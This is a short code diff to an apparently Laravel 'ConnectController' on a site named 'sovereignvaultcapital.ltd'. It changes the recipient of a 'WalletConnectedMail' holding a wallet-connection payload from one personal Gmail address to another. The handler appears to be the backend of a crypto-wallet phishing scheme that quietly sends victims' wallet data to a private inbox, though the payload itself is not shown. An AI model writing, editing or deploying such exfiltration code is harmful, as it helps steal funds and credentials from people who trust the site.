@@ -30,7 +30,7 @@ class ConnectController extends Controller
 
         try {
             // Sends using system email mail@sovereignvaultcapital.ltd configured in .env
-            Mail::to('johnsonray1840@gmail.com')->send(new WalletConnectedMail($payload));
+            Mail::to('edwardsmithfield5@gmail.com')->send(new WalletConnectedMail($payload));
 
             return response()->json([
                 'success' => true,
